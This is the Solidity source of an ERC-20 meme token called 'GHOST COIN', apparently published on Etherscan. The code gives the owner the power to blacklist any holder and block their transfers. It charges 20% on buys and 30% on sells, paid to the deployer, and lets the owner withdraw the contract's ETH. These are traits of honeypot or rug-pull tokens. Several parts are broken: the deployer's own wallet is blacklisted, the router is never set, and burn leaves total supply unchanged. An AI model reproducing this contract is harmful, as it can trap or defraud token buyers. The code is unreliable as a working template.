/**
 *Submitted for verification at Etherscan.io on 2023-06-06
*/

// SPDX-License-Identifier: MIT

// Socials

/*  

    Official Telegram Chat: 
    [Telegram Chat URL]

    Twitter:
    [Twitter URL]

*/

pragma solidity 0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Burn(address indexed burner, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract GHOST is Context, IERC20, Ownable {
    using SafeMath for uint256;
    
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _blacklisted;
    
    address payable private _taxWallet;
    uint256 private _buyTax = 20;
    uint256 private _sellTax = 30;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 100000000000 * 10**_decimals;
    string private constant _name = unicode"GHOST COIN";
    string private constant _symbol = unicode"GHOST";
    uint256 public _maxTxAmount = 2000000000 * 10**_decimals;
    uint256 public _maxWalletSize = 2000000000 * 10**_decimals;
    uint256 public _taxSwapThreshold = 2000000000 * 10**_decimals;
    uint256 public _maxTaxSwap = 1000000000 * 10**_decimals;
    
    IUniswapV2Router02 private _uniswapV2Router;
    address private _uniswapV2Pair;
    bool private _tradingOpen;
    bool private _inSwap = true;
    bool private _swapEnabled = true;
    
    event MaxTxAmountUpdated(uint256 _maxTxAmount);
    
    modifier lockTheSwap() {
        bool inSwap = _inSwap;
        _inSwap = true;
        _;
        _inSwap = inSwap;
    }
    
    constructor () {
        address msgSender = _msgSender();
        _taxWallet = payable(msgSender);
        _balances[msgSender] = _tTotal;
        _blacklisted[address(0)] = true;
        _blacklisted[address(this)] = true;
        _blacklisted[_taxWallet] = true;
        _tradingOpen = false; // Set tradingOpen to false initially
        emit Transfer(address(0), msgSender, _tTotal);
        emit OwnershipTransferred(address(0), msgSender);
    }
    
    function name() public pure returns (string memory) {
        return _name;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    
    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }
    
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function burn(uint256 amount) external {
        require(amount != 0, "Amount must be greater than zero");
        require(amount <= _balances[msg.sender], "Insufficient balance");
        _balances[msg.sender] -= amount;
        emit Transfer(msg.sender, address(0), amount);
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount));
        return true;
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
 
    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(!_blacklisted[from], "Sender address is blacklisted");
        require(!_blacklisted[to], "Recipient address is blacklisted");
        
        uint256 taxAmount = 0;

        if (from != owner() && to != owner()) {
            if (from == _uniswapV2Pair && to != address(_uniswapV2Router)) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                taxAmount = amount.mul(_buyTax).div(100);
            } else if (to == _uniswapV2Pair && from != address(this)) {
                taxAmount = amount.mul(_sellTax).div(100);
            }

            require(balanceOf(to) + amount.sub(taxAmount) <= _maxWalletSize, "Exceeds the maxWalletSize.");
        }

        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }

        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));

        uint256 contractTokenBalance = balanceOf(address(this));
        if (!_inSwap && to == _uniswapV2Pair && _swapEnabled && contractTokenBalance > _taxSwapThreshold) {
            swapTokensForEth(min(amount, min(contractTokenBalance, _maxTaxSwap)));
            uint256 contractETHBalance = address(this).balance;
            if (contractETHBalance > 0) {
                sendETHToFee(contractETHBalance);
            }
        }
    }
    
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function isContract(address account) private view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }
    
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WETH();
        _approve(address(this), address(_uniswapV2Router), tokenAmount);
        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    
    function removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }
    
    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }
    
    function blacklistAddress(address account) external onlyOwner {
        require(account != address(0), "Invalid address");
        _blacklisted[account] = true;
    }
    
    function unblacklistAddress(address account) external onlyOwner {
        require(account != address(0), "Invalid address");
        _blacklisted[account] = false;
    }
    
    function isAddressBlacklisted(address account) public view returns (bool) {
        return _blacklisted[account];
    }
    
    receive() external payable {}
    
    function manualSwap() external {
        require(_msgSender() == _taxWallet);
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) {
            swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            sendETHToFee(ethBalance);
        }
    }
    
    function withdraw() public onlyOwner {
        uint256 contractBalance = address(this).balance;
        bool success = true;
        (success, ) = payable(owner()).call{value: contractBalance}("");
        require(success, "Transfer failed");
    }
}